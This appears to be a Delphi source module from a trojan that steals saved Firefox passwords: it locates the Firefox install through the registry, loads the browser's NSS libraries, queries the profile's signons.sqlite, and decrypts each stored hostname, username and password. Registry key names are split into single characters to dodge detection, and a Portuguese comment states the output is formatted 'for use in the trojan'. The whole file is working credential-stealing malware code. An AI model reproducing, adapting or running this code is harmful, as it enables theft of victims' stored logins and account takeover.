unit UnitFireFox3_5;

interface

uses
  windows;

function Mozilla3_5Password: string;

implementation

uses
  SQLiteTable3,
  UnitDiversos,
  sqlite3;

var
  version, FireFoxPath: string;


function ReadKeyToString(hRoot:HKEY; sKey:string; sSubKey:string):string;
var
  hOpen: HKEY;
  sBuff: array[0..255] of char;
  dSize: integer;
begin
  if (RegOpenKeyEx(hRoot, PChar(sKey), 0, KEY_QUERY_VALUE, hOpen) = ERROR_SUCCESS) then
  begin
    dSize := SizeOf(sBuff);
    RegQueryValueEx(hOpen, PChar(sSubKey), nil, nil, @sBuff, @dSize);
    Result := sBuff
  end;
  RegCloseKey(hOpen);
end;

procedure GetFFInfos;
var
  soft,moz,fire: string;
begin
  soft:= 'S'+'O'+'F'+'T'+'W'+'A'+'R'+'E'+'\';
  moz:= 'M'+'o'+'z'+'i'+'l'+'l'+'a';
  fire:= 'F'+'i'+'r'+'e'+'f'+'o'+'x';
  version := ReadKeyToString(HKEY_LOCAL_MACHINE, soft+moz+'\'+moz+' '+fire, 'CurrentVersion');
  FireFoxPath:= ReadKeyToString(HKEY_LOCAL_MACHINE, soft+moz+'\'+moz+' '+fire+'\' + version + '\Main', 'Install Directory') + '\';
end;


function Mozilla3_5Password: string;
type
  TSECItem = packed record
  SECItemType: dword;
  SECItemData: pchar;
  SECItemLen: dword;
end;
  PSECItem = ^TSECItem;
var
  DLLHandle: THandle;
  NSSModule: THandle;
  hToken: THandle;
  NSS_Init: function(configdir: pchar): dword; cdecl;
  NSSBase64_DecodeBuffer: function(arenaOpt: pointer; outItemOpt: PSECItem; inStr: pchar; inLen: dword): dword; cdecl;
  PK11_GetInternalKeySlot: function: pointer; cdecl;
  PK11_Authenticate: function(slot: pointer; loadCerts: boolean; wincx: pointer): dword; cdecl;
  PK11SDR_Decrypt: function(data: PSECItem; result: PSECItem; cx: pointer): dword; cdecl;
  NSS_Shutdown: procedure; cdecl;
  PK11_FreeSlot: procedure(slot: pointer); cdecl;
  ProfilePath: array [0..MAX_PATH] of char;
  ProfilePathLen: dword;
  FirefoxProfilePath: pchar;
  MainProfile: array [0..MAX_PATH] of char;
  MainProfilePath: pchar;
  EncryptedSECItem: TSECItem;
  DecryptedSECItem: TSECItem;
  SQLiteDatabase: TSQLiteDatabase;
  SQLIteTable: TSQLIteTable;
  KeySlot: pointer;
  i:integer;
  username,password:string;
begin
  GetFFInfos;
  merdadll := FireFoxPath + 'sqlite3.dll';

  dllhandle:= LoadLibrary(pchar(FirefoxPath + 'mozcrt19.dll'));
  LoadLibrary(pchar(FirefoxPath + 'nspr4.dll'));
  LoadLibrary(pchar(FirefoxPath + 'plc4.dll'));
  LoadLibrary(pchar(FirefoxPath + 'plds4.dll'));
  LoadLibrary(pchar(FirefoxPath + 'nssutil3.dll'));

  //aqui é o problema....
  //dllhandle:= LoadLibrary(pchar(FirefoxPath + 'softokn3.dll'));

  NSSModule := LoadLibrary(pchar(FirefoxPath + 'nss3.dll'));
  @NSS_Init := GetProcAddress(NSSModule, pchar('NSS_Init'));
  @NSSBase64_DecodeBuffer := GetProcAddress(NSSModule, pchar('NSSBase64_DecodeBuffer'));
  @PK11_GetInternalKeySlot := GetProcAddress(NSSModule, pchar('PK11_GetInternalKeySlot'));
  @PK11_Authenticate := GetProcAddress(NSSModule, pchar('PK11_Authenticate'));
  @PK11SDR_Decrypt := GetProcAddress(NSSModule, pchar('PK11SDR_Decrypt'));
  @NSS_Shutdown := GetProcAddress(NSSModule, pchar('NSS_Shutdown'));
  @PK11_FreeSlot := GetProcAddress(NSSModule, pchar('PK11_FreeSlot'));
  OpenProcessToken(GetCurrentProcess, TOKEN_QUERY, hToken);
  ProfilePathLen := MAX_PATH;
  ZeroMemory(@ProfilePath, MAX_PATH);
  GetEnvironmentVariable('APPDATA',ProfilePath,ProfilePathLen);
  FirefoxProfilePath := pchar(profilePath +'\Mozilla\Firefox\profiles.ini');
  GetPrivateProfileString('Profile0', 'Path', '', MainProfile, MAX_PATH, FirefoxProfilePath);
  MainProfilePath := pchar(profilePath + '\Mozilla\Firefox\' + mainProfile + '\' + 'signons.sqlite');
  SQLiteDatabase := TSQLiteDatabase.Create(MainProfilePath);
  SQLIteTable := SQLiteDatabase.GetTable('SELECT * FROM moz_logins');
  if SQLIteTable.Count > 0 then
  begin
    if NSS_Init(pchar(profilePath + '\Mozilla\Firefox\' + mainProfile)) = 0 then
    begin
      KeySlot := PK11_GetInternalKeySlot;
      if KeySlot <> nil then
      begin
        if PK11_Authenticate(KeySlot, True, nil) = 0 then
        begin
          for i := 0 to SQLIteTable.Count -1 do
          begin
            result := result + SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['hostname']) + #13#10;
            username:= SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['encryptedUsername']);
            Password := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['encryptedPassword']);
            NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Username), Length(Username));
            PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil);
            Result := result + DecryptedSECItem.SECItemData + #13#10;
            NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Password), Length(Password));
            PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil);
            Result := result + DecryptedSECItem.SECItemData + #13#10;
            SQLIteTable.Next;
          end;
        end else result:= result + '';//'PK11_Authenticate Failed!';
        PK11_FreeSlot(KeySlot);
      end else
      result:= result + '';//'PK11_GetInternalKeySlot Failed!';
      NSS_Shutdown;
    end else
    result:= result + '';//'NSS_Init Failed!';
  end;
  SQLIteTable.Free;
  SQLiteDatabase.Free;

  // para usar no trojan...
  if result <> '' then
  result := replacestring(#13#10, '|', result);
end;

end.
